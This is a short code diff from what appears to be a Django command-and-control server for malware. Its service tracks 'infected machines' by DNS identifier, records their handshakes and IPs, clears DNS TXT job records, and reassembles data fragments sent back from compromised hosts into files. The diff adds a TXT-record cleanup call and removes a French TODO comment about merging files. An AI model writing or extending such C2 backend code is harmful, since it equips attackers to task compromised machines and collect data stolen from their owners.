@@ -7,6 +7,7 @@ from django.utils import timezone
 
 from djangoproject.constants.DnsMatchEnum import DnsMatchEnum
 from djangoproject.models import InfectedMachine
+from djangoproject.services.DnsService import DnsService
 
 
 class ExecService:
@@ -28,6 +29,8 @@ class ExecService:
         machine.last_handshake_at = timezone.now()
         machine.ip = ip
         machine.save()
+
+        DnsService().remove_job_txt(machine)
 
     def process_job_return_fragment(self, machine_id: str, data: str, chunk_id: str):
         machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
@@ -60,7 +63,6 @@ class ExecService:
         job.finished_at = timezone.now()
         job.save()
 
-        # TODO fusionner les fichiers
         data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
         chunks = [f for f in os.listdir(data_folder) if f.startswith('chunk-')]
         with open(f"{data_folder}/final-file", "w") as f:
